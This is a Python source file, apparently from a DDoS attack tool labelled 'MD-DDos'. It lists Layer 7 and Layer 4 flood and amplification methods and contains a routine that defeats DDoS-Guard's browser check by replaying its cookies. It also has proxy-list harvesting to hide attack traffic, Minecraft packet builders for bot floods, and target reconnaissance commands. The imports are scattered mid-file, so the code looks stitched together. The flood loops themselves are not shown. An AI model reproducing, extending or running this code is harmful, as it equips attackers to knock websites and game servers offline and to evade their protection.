from logging import basicConfig, FileHandler, Formatter, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from re import compile
from socket import socket
from struct import pack as data_pack
from sys import exit as _exit
from typing import Tuple
from uuid import UUID
from typing import Set
from concurrent.futures import ThreadPoolExecutor, as_completed

from PyRoxy import Proxy, ProxyType, ProxyUtiles
from requests import Response, Session, cookies, get, exceptions

# Initializing logger
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MD-DDos")
logger.setLevel("INFO")

# Add file handler
file_handler = FileHandler('md-ddos.log')
file_handler.setFormatter(Formatter('[%(asctime)s - %(levelname)s] %(message)s', datefmt="%Y-%m-%d %H:%M:%S"))
logger.addHandler(file_handler)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
                                "TS3", "MCPE", "ICMP"
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


from contextlib import suppress
from time import sleep
from socket import AF_INET, SOCK_RAW, IPPROTO_TCP, gethostname
from dns import resolver
from icmplib import ping
from psutil import cpu_percent, net_io_counters, virtual_memory


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def info(domain: str) -> dict:
        with suppress(Exception):
            return get(f"http://ip-api.com/json/{domain}?fields=status,message,country,city,regionName,org,isp").json()
        return {"status": "fail"}

    @staticmethod
    def tssrv(domain: str) -> dict:
        with suppress(Exception):
            return get(f"https://api.mcsrvstat.us/2/{domain}").json()
        return {"online": False}

    @staticmethod
    def ping(domain: str):
        logger.info(f"Pinging {domain}...")
        try:
            host = ping(domain, count=5, interval=0.2, timeout=2)
            logger.info(f"--- {host.address} ping statistics ---")
            logger.info(f"{host.packets_sent} packets transmitted, {host.packets_received} received, {host.packet_loss*100:.2f}% packet loss")
            if host.is_alive:
                logger.info(f"Round-trip min/avg/max/mdev = {host.min_rtt:.2f}/{host.avg_rtt:.2f}/{host.max_rtt:.2f}/{host.jitter:.2f} ms")
        except Exception as e:
            logger.error(f"Ping failed: {e}")

    @staticmethod
    def runConsole():
        cons = f"{bcolors.OKGREEN}{gethostname()}{bcolors.RESET}@{bcolors.OKBLUE}MHTools{bcolors.RESET}:~# "

        while True:
            try:
                cmd_line = input(cons).strip()
            except KeyboardInterrupt:
                _exit(0)

            if not cmd_line:
                continue

            parts = cmd_line.split()
            cmd = parts[0].upper()
            args = parts[1:]

            if cmd in ["HELP", "?"]:
                print("Tools: " + ", ".join(sorted(list(ToolsConsole.METHODS))))
                print("Commands: HELP, CLEAR, EXIT")
            elif cmd in {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                _exit(0)
            elif cmd == "CLEAR":
                print("\033c", end="")
            elif cmd not in ToolsConsole.METHODS:
                print(f"Command '{cmd}' not found. Type 'HELP' for a list of commands.")
            elif cmd == "DSTAT":
                try:
                    ld = net_io_counters()
                    print("Press Ctrl+C to stop.")
                    while True:
                        sleep(1)
                        od = ld
                        ld = net_io_counters()
                        t = [(last - now) for now, last in zip(od, ld)]
                        print(
                            f"Bytes Sent: {Tools.humanbytes(t[0])} | "
                            f"Bytes Received: {Tools.humanbytes(t[1])} | "
                            f"Packets Sent: {Tools.humanformat(t[2])} | "
                            f"Packets Received: {Tools.humanformat(t[3])} | "
                            f"CPU: {cpu_percent()}% | "
                            f"Memory: {virtual_memory().percent}%", end='\r'
                        )
                except KeyboardInterrupt:
                    print()
                    continue
            elif cmd == "CFIP" or cmd == "DNS":
                 print("This feature is not implemented yet.")
            elif cmd == "CHECK":
                if not args:
                    print("Usage: CHECK <url>")
                    continue
                target_url = args[0]
                try:
                    logger.info(f"Checking {target_url}...")
                    res = get(target_url, timeout=10)
                    logger.info(f"Status Code: {res.status_code} - {'ONLINE' if res.ok else 'OFFLINE'}")
                except Exception as e:
                    logger.error(f"Failed to check {target_url}: {e}")
            elif cmd == "INFO":
                if not args:
                    print("Usage: INFO <domain/ip>")
                    continue
                domain = args[0]
                info = ToolsConsole.info(domain)
                if info.get("status") == "success":
                    logger.info(
                        f"Country: {info.get('country')}\n"
                        f"City: {info.get('city')}\n"
                        f"Org: {info.get('org')}\n"
                        f"ISP: {info.get('isp')}\n"
                        f"Region: {info.get('regionName')}"
                    )
                else:
                    logger.error(f"Could not retrieve info for {domain}: {info.get('message')}")
            elif cmd == "TSSRV":
                if not args:
                    print("Usage: TSSRV <domain>")
                    continue
                domain = args[0]
                info = ToolsConsole.tssrv(domain)
                if info.get("online"):
                    logger.info(
                        f"IP: {info.get('ip')}:{info.get('port')}\n"
                        f"Hostname: {info.get('hostname')}\n"
                        f"Version: {info.get('version')}\n"
                        f"Players: {info['players']['online']}/{info['players']['max']}"
                    )
                else:
                    logger.error(f"Server {domain} is offline.")
            elif cmd == "PING":
                if not args:
                    print("Usage: PING <domain/ip>")
                    continue
                domain = args[0]
                ToolsConsole.ping(domain)
